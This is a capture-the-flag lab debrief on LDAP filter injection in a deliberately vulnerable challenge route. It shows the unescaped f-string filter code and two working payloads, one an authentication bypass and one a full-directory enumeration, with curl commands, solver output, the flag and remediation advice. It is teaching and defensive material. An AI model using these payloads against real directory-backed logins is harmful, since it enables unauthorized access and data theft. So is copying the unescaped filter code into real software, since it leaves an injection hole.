# Zodiac Twelve Directory Breach, Debrief

**Node:** `p4_3` &middot; **Flag:** `SEIYAKU{star_closes_the_filter}` &middot; **Route:** `GET/POST /p4/zodiac` &middot; **Sink:** `challenges/phase4.py`, real OpenLDAP (`ou=zodiac,dc=hunterassoc,dc=org`) via `core/db.py`'s `ldap_conn()` &middot; **Signal:** the matched entry/entries, fully revealed on success

## LDAP basics, briefly

- **DIT** (Directory Information Tree): LDAP's data model is a tree of
  entries, not tables/rows. This lab's tree is
  `dc=hunterassoc,dc=org` &rarr; `ou=zodiac,dc=hunterassoc,dc=org` &rarr;
  thirteen `uid=<name>,ou=zodiac,dc=hunterassoc,dc=org` leaf entries
  (twelve committee members plus `uid=chairman`).
- **DN** (Distinguished Name): an entry's full path in that tree, e.g.
  `uid=chairman,ou=zodiac,dc=hunterassoc,dc=org`, LDAP's equivalent of
  a primary key plus its full location.
- **LDIF**: the text format the directory is seeded from
  (`seed/ldap/zodiac.ldif`), a sequence of `dn: ...` blocks each
  followed by `attribute: value` lines.
- **Filter**: how you *ask* the directory something. Unlike SQL, an LDAP
  search filter (RFC 4515) is a small, fully-parenthesized prefix
  grammar, every clause is wrapped in its own `(...)`, and clauses
  combine via a handful of operators:
  - `=`, equality: `(uid=rat)` matches entries whose `uid` is exactly `rat`.
  - `&`, AND, prefix form: `(&(A)(B))` means "A and B."
  - `|`, OR, prefix form: `(|(A)(B))` means "A or B."
  - `!`, NOT: `(!(A))`.
  - `*`, wildcard/presence. Inside a value, `*` is a substring wildcard;
    as an entire value by itself, `(attr=*)` means "this attribute is
    present, with any value at all", no need to know or guess what
    that value actually is.
  - `\` + two hex digits, the escape sequence for a literal occurrence
    of any of the above (plus NUL), per RFC 4515 §3: `\28`/`\29` for a
    literal `(`/`)`, `\2a` for a literal `*`, `\5c` for a literal `\`.

## The bug, in one line

Two routes' worth of logic in `challenges/phase4.py`'s p4_3 block build a
real LDAP filter with plain Python f-strings, and never call
`ldap.filter.escape_filter_chars()`, python-ldap's own RFC-4515
escaping helper, on any piece of request-supplied text before it lands
inside that filter string. An ordinary uid, username, or password
contains none of `( ) & | ! *` or a backslash, so ordinary use is
completely unremarkable; a caller who includes one of those characters
gets to add, close, reopen, or wildcard a clause of their own.

## The vulnerable sinks

```python
# challenges/phase4.py, p4_3, directory search (GET ?uid=...)
if search_uid:
    # VULN: `search_uid` is dropped straight into this filter via an
    # f-string, completely unescaped.
    search_filter = f"(&(uid={search_uid})(objectClass=inetOrgPerson))"
    entries, search_error = _zodiac_search(search_filter)
```

```python
# challenges/phase4.py, p4_3, sign-in (POST username/password)
if request.method == "POST":
    username, password = _zodiac_credentials()
    # VULN: `username` and `password` are dropped straight into this
    # filter via an f-string, completely unescaped, no
    # escape_filter_chars() call anywhere before this line.
    login_filter = f"(&(uid={username})(userPassword={password}))"
    entries, login_error = _zodiac_search(login_filter)
```

Both funnel into `_zodiac_search()`, which opens a real connection via
`core/db.py`'s `ldap_conn()` (the app's own service bind, `cn=admin,
dc=hunterassoc,dc=org` per `docker-compose.yml`, never a caller-supplied
bind) and calls real `conn.search_s(base, ldap.SCOPE_SUBTREE, filter)`
against the real seeded directory.

## Why a normal, well-formed `uid=chairman` lookup still doesn't leak the flag

The search route's display logic is a deliberate gate, independent of
the filter-building bug: `uid` is the directory's unique naming
attribute, so a well-formed, non-injected single-uid search can only
ever match **zero or one** entry. The route only ever shows the curated
view (`_public_member`, `dn`/`uid`/`cn`/`title`/`mail`, never
`description`) for exactly one match, no matter who that one match is,
`uid=chairman` included. `description` (and the chairman's real
`userPassword`) is only ever surfaced by `_raw_member`, and that path
only runs once a search returns **more than one** match, something a
legitimate, unmodified `uid=<name>` query can never do, since it can
only happen once the filter has already been widened past what a single
uid could ever legitimately select.

```python
# challenges/phase4.py, p4_3
search_dump_mode = len(entries) > 1
if search_dump_mode:
    search_members = [_raw_member(dn, attrs) for dn, attrs in entries]
else:
    search_members = [_public_member(dn, attrs) for dn, attrs in entries]
```

Live proof this gate holds even for a direct, intentional
`uid=chairman` request with zero injection:

```bash
curl -s -G "$BASE/p4/zodiac" -H "Accept: application/json" --data-urlencode "uid=chairman"
```

```json
{"login":{"attempted":false,"error":null,"member":null,"submitted_username":null,"success":false},"search":{"count":1,"dump_mode":false,"error":null,"members":[{"cn":"Chairman","dn":"uid=chairman,ou=zodiac,dc=hunterassoc,dc=org","mail":"chairman@hunterassoc.org","title":"Chairman, Zodiac Committee","uid":"chairman"}],"uid":"chairman"}}
```

`dump_mode:false`, and there is no `description` key anywhere in that
entry, the flag genuinely is not reachable this way.

## Payload 1, auth bypass: `username=*)(uid=*`, `password=*`

The login filter template is `(&(uid={username})(userPassword={password}))`.
Substituting `username = "*)(uid=*"` and `password = "*"` character-for-character:

```
(&(uid=          <- template
*)(uid=*          <- username, verbatim
)(userPassword=   <- template
*                 <- password, verbatim
))                <- template
```

concatenates to the **actual rewritten filter string**:

```
(&(uid=*)(uid=*)(userPassword=*))
```

This is a completely well-formed RFC-4515 filter, every paren still
balances, it's just no longer the two-clause filter the route intended
to run. Parsed, it's `AND(uid=*, uid=*, userPassword=*)`: "has a `uid`
attribute (true for all 13 members) AND has a `uid` attribute again
(the harmless leftover clause the `)(uid=` breakout added) AND has a
`userPassword` attribute, with any value at all (also true for all 13
, every seeded member has one)." No real credential is supplied
anywhere, and the filter genuinely can't fail to match every member.

`password=*` deliberately isn't a paren-breakout, it's the *other*
LDAP-specific metacharacter at work: a bare `*` as an entire value is
already a presence/wildcard assertion on its own, no parenthesis
manipulation needed for that field at all. That's the concrete
difference from a SQL/Mongo-style bypass this lesson is built to show:
LDAP's own equality operator has a wildcard baked in that neither of
those other query languages has.

Live proof against the real running stack:

```bash
curl -s -X POST "$BASE/p4/zodiac" -H "Accept: application/json" \
    --data-urlencode 'username=*)(uid=*' \
    --data-urlencode 'password=*'
```

```json
{"login":{"attempted":true,"error":null,"member":{"cn":"Ox","dn":"uid=ox,ou=zodiac,dc=hunterassoc,dc=org","mail":"ox@hunterassoc.org","title":"Zodiac Committee Member","uid":"ox"},"submitted_username":"*)(uid=*","success":true},"search":{"count":null,"dump_mode":false,"error":null,"members":[],"uid":null}}
```

`success:true`, logged in as `uid=ox`, genuine real OpenLDAP natural
search order decided *which* member came back first (this route never
sorts or special-cases the result, same convention as p4_2's guardian
bypass); the point isn't *which* member you land on, it's that you land
on a real one with no valid credential supplied at all. (A real
attacker who wanted a *specific* seat could narrow the same trick,
`username=chairman)(|(uid=*`, to prefer that DN; this route logs in as
whoever `search_s()` returns first either way.)

## Payload 2, directory enumeration: `uid=*)(objectClass=*`

The search filter template is `(&(uid={uid})(objectClass=inetOrgPerson))`.
Substituting `uid = "*)(objectClass=*"`:

```
(&(uid=                    <- template
*)(objectClass=*            <- uid, verbatim
)(objectClass=inetOrgPerson) <- template
)                            <- template
```

concatenates to the **actual rewritten filter string**:

```
(&(uid=*)(objectClass=*)(objectClass=inetOrgPerson))
```

Again fully balanced and well-formed: `AND(uid=*, objectClass=*,
objectClass=inetOrgPerson)`, "has a `uid` (true for every member, and
specifically false for the `ou=zodiac` container entry itself, which
has no `uid`) AND has any `objectClass` at all (true for literally
everything) AND is an `inetOrgPerson` (true for all 13 members)." The
net effect: every one of the 13 member entries matches, and the search
which was only ever meant to find one specific uid instead returns the
entire roster.

Live proof against the real running stack (13 entries returned,
`dump_mode:true`, `uid=chairman`'s `description` genuinely present in
the response, full transcript trimmed to the chairman entry for
readability, the untrimmed 13-entry response is what
`solvers/p4_3.sh` actually asserts against):

```bash
curl -s -G "$BASE/p4/zodiac" -H "Accept: application/json" --data-urlencode 'uid=*)(objectClass=*'
```

```json
{"search":{"count":13,"dump_mode":true,"uid":"*)(objectClass=*", "members":[
  {"uid":"rat", "description":null, "...": "..."},
  {"uid":"ox", "description":null, "...": "..."},
  "... ten more committee members, each description:null ...",
  {"cn":"Chairman","description":"SEIYAKU{star_closes_the_filter}","dn":"uid=chairman,ou=zodiac,dc=hunterassoc,dc=org","mail":"chairman@hunterassoc.org","title":"Chairman, Zodiac Committee","uid":"chairman"}
]}}
```

Every committee member's `description` is genuinely `null` (they were
never seeded with one, only the `ou=zodiac` container entry and
`uid=chairman` have that attribute at all); `uid=chairman`'s is the real
flag, recovered purely by widening a filter that was only ever supposed
to select one specific uid.

An even simpler variant of the same root cause, worth knowing: `uid=*`
alone (no parenthesis breakout at all) also enumerates the entire
roster, since `*` as the *entire* value of the existing `uid={...}`
slot already becomes a presence/wildcard assertion, the paren-breakout
payload above is shown because it's the one that generalizes to fields
where a bare wildcard alone wouldn't be enough (e.g. it's exactly the
technique the login filter's `username` field above needs).

## The full solver, live

`solvers/p4_3.sh` runs all four checks below against the real running
stack, in order: (1) a genuine wrong-password login must fail, (2) a
direct `uid=chairman` lookup must not leak `description`, (3) the
auth-bypass payload, (4) the enumeration payload. This is the actual,
unedited output of a real run against this exact seed (`SEIYAKU_BASE`
was the default `http://localhost:8000` for this run):

```
[p4_3] target: http://localhost:8000/p4/zodiac
[p4_3] step 1, legitimate login with a wrong/guessed plain-string password
  POST username=chairman&password=totally-wrong-guess
  response: {"login":{"attempted":true,"error":null,"member":null,"submitted_username":"chairman","success":false},"search":{"count":null,"dump_mode":false,"error":null,"members":[],"uid":null}}
  ok: wrong plain-string password was correctly rejected
[p4_3] step 2, normal, non-injected directory search for uid=chairman
  GET /p4/zodiac?uid=chairman
  response: {"login":{"attempted":false,"error":null,"member":null,"submitted_username":null,"success":false},"search":{"count":1,"dump_mode":false,"error":null,"members":[{"cn":"Chairman","dn":"uid=chairman,ou=zodiac,dc=hunterassoc,dc=org","mail":"chairman@hunterassoc.org","title":"Chairman, Zodiac Committee","uid":"chairman"}],"uid":"chairman"}}
  ok: a direct, well-formed uid=chairman lookup does not leak description
[p4_3] step 3, auth bypass: username=*)(uid=* & password=*
  response: {"login":{"attempted":true,"error":null,"member":{"cn":"Ox","dn":"uid=ox,ou=zodiac,dc=hunterassoc,dc=org","mail":"ox@hunterassoc.org","title":"Zodiac Committee Member","uid":"ox"},"submitted_username":"*)(uid=*","success":true},"search":{"count":null,"dump_mode":false,"error":null,"members":[],"uid":null}}
  ok: filter-injection auth bypass logged in with no valid credential
[p4_3] step 4, directory enumeration: uid=*)(objectClass=*
  response: {"login":{"attempted":false,"error":null,"member":null,"submitted_username":null,"success":false},"search":{"count":13,"dump_mode":true,"error":null,"members":[{"cn":"Rat","description":null,...},{"cn":"Ox","description":null,...},{"cn":"Tiger","description":null,...},{"cn":"Rabbit","description":null,...},{"cn":"Dragon","description":null,...},{"cn":"Snake","description":null,...},{"cn":"Horse","description":null,...},{"cn":"Goat","description":null,...},{"cn":"Monkey","description":null,...},{"cn":"Rooster","description":null,...},{"cn":"Dog","description":null,...},{"cn":"Pig","description":null,...},{"cn":"Chairman","description":"SEIYAKU{star_closes_the_filter}","dn":"uid=chairman,ou=zodiac,dc=hunterassoc,dc=org","mail":"chairman@hunterassoc.org","title":"Chairman, Zodiac Committee","uid":"chairman"}],"uid":"*)(objectClass=*"}}
  ok: enumeration payload dumped the full roster, flag recovered: SEIYAKU{star_closes_the_filter}
[p4_3] ok: wrong password rejected, direct chairman lookup safe, bypass +
[p4_3]     enumeration both worked against the real seeded OpenLDAP directory
[p4_3] PASS
```

(This run followed a `docker compose down -v` + `up` immediately before
testing, specifically to confirm the real flag, not the LDIF's
original `SEIYAKU{placeholder_replace_me_in_task_4_2}` placeholder,
actually lands in the freshly-seeded directory, since osixia/openldap's
`LDAP_SEED_INTERNAL_LDIF_PATH` mechanism only applies `*.ldif` files on
first boot of an *empty* data volume.)

## HxH analogy

The Zodiac Twelve's whole identity, as `CHALLENGER.md` frames it, is
rigidity: thirteen seats, thirteen entries, nothing ambiguous about who
holds which one. That rigidity is real, and this directory never
betrays it on its own terms, a `uid` genuinely can only ever name one
entry, and the route's own logic genuinely never shows the chairman's
secret for a clean, single-entry match. What breaks isn't the
directory's rule that a uid is unique. It's that the *question* being
asked of the directory was never protected from being rewritten before
it arrived, `*)(uid=*` doesn't ask "who is this," it asks a
structurally different, much bigger question ("who is *anyone*"), and
the directory, faithfully rigid as ever, answers it exactly as asked.
Manipulation, once more: the Zodiac Twelve's hierarchy was never
undermined from outside it. The question you were allowed to ask it was
simply never the only question its own grammar could express.

## Remediation

- **Escape LDAP filter metacharacters before any request-supplied text
  reaches a filter string, always.** python-ldap ships this exact
  helper, the fix is one import and one call per field:

  ```python
  from ldap.filter import escape_filter_chars

  login_filter = (
      f"(&(uid={escape_filter_chars(username)})"
      f"(userPassword={escape_filter_chars(password)}))"
  )
  ```

  `escape_filter_chars()` turns every `( ) & | ! *` and backslash (and
  NUL) into its RFC-4515 `\XX` hex escape, so an attacker-supplied `*`
  or `)` becomes a literal character to match against, never a filter
  metacharacter again, this alone closes both payloads above outright.
- **Allow-list validation on top of escaping**, especially for `uid`:
  directory uids in this lab are short lowercase words with no special
  characters at all, so rejecting anything that doesn't match
  `^[a-z0-9._-]+$` before it ever reaches a filter is a second,
  independent layer that would have stopped both payloads even without
  the escaping fix.
- **Least-privilege bind account.** This route already binds as the
  application's own service account (`cn=admin,...` here, for lab
  simplicity) rather than as the searching user, a real deployment
  should bind as an account with read access to only the attributes a
  given feature actually needs (e.g. no read access to `userPassword`
  or `description` at all for a route that's only ever supposed to
  return `cn`/`title`/`mail`), so a filter-injection bug in application
  logic still can't read what the directory itself never grants that
  account.
- **Never build a directory filter, or any structured query, by raw
  string concatenation.** This is the same generalization p4_1's and
  p4_2's remediations already reach for MongoDB: any interface that
  parses a string into a query (SQL, an LDAP filter, a regex, a shell
  command) has an injection surface the moment attacker-controlled text
  reaches it unescaped, regardless of which specific characters that
  particular grammar happens to treat as special.
- **Authenticate via a real bind, not a search-and-compare on
  `userPassword`.** This route's login (like p4_2's) checks credentials
  by searching for an entry whose `userPassword` matches a supplied
  value, convenient for a teaching lab, but a real system should
  attempt `simple_bind_s(dn, password)` as the candidate user's own DN
  and treat only a successful bind as authentication, never a filter
  match against a password attribute value.
